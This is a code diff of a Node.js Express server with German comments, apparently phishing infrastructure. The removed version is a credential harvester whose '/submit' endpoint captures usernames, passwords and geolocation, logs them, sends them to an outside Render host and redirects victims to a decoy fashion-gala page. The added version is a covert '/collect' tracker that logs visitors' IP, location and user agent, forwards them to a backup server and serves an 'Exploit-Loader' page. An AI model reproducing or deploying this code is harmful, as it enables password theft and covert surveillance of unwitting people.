@@ -1,85 +1,45 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs');
+const geoip = require('geoip-lite');
 const fetch = require('node-fetch');
-const geoip = require('geoip-lite'); // Für IP-Geolocation
-const device = require('express-device'); // Für Device-Tracking
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000; // Render bevorzugt Port 10000
 
-// Middleware für erweitertes Tracking
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json());
-app.use(device.capture()); // Device-Typ (Mobile/Desktop) erkennen
+// Middleware für IP-Erkennung (wichtig hinter Proxy)
+app.set('trust proxy', true);
 
-// Erweiterte Log-Datei mit mehr Metadaten
-const logSubmission = (data) => {
-  const logEntry = {
-    timestamp: new Date().toISOString(),
-    ip: data.ip,
-    userAgent: data.userAgent,
-    deviceType: data.deviceType,
-    browser: data.browser,
-    os: data.os,
-    username: data.username,
-    password: data.password,
-    latitude: data.latitude,
-    longitude: data.longitude,
-    city: data.city,
-    country: data.country
-  };
-  fs.appendFileSync('submissions.log', JSON.stringify(logEntry) + '\n');
-};
-
-// Standort-API (falls JavaScript-Geolocation blockiert)
-const getIPLocation = (ip) => {
-  const geo = geoip.lookup(ip);
-  return geo ? { city: geo.city, country: geo.country } : null;
-};
-
-// POST-Endpoint für Datenklau
-app.post('/submit', async (req, res) => {
-  try {
-    const { username, password, latitude, longitude } = req.body;
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const ipLocation = getIPLocation(clientIp);
-
-    const logData = {
-      ip: clientIp,
-      userAgent: req.headers['user-agent'],
-      deviceType: req.device.type, // Mobile/Desktop
-      browser: req.useragent.browser,
-      os: req.useragent.os,
-      username,
-      password,
-      latitude,
-      longitude,
-      city: ipLocation?.city || "Unbekannt",
-      country: ipLocation?.country || "Unbekannt"
+// Tracking-Endpoint (unsichtbar)
+app.get('/collect', (req, res) => {
+    const ip = req.ip;
+    const geo = geoip.lookup(ip);
+    const userAgent = req.headers['user-agent'];
+    
+    const data = {
+        timestamp: new Date(),
+        ip: ip,
+        userAgent: userAgent,
+        estimatedLocation: geo ? `${geo.city}, ${geo.country}` : "Unknown",
+        referrer: req.headers['referer'] || "Direct"
     };
 
-    logSubmission(logData); // Lokal speichern
+    // Lokal speichern
+    fs.appendFileSync('tracking.log', JSON.stringify(data) + '\n');
 
-    // Optional: Daten an externen Server senden
-    await fetch('https://loropiana1.onrender.com/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(logData)
+    // Optional: Daten an zweiten Server schicken
+    fetch('https://dein-backup-server.xyz/log', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
     });
 
-    // Unauffällige Weiterleitung
-    res.redirect('/fashion-gala.html');
-
-  } catch (error) {
-    console.error("❌ Fehler:", error);
-    res.status(500).send("Serverfehler");
-  }
+    res.sendStatus(204); // Unsichtbare Antwort
 });
 
-// Starte den Server
-app.listen(PORT, () => {
-  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
+// Hauptseite mit Exploit-Loader
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
+
+app.listen(PORT, () => console.log(`Zeta-Tracker läuft auf Port ${PORT} 🏴‍☠️`));
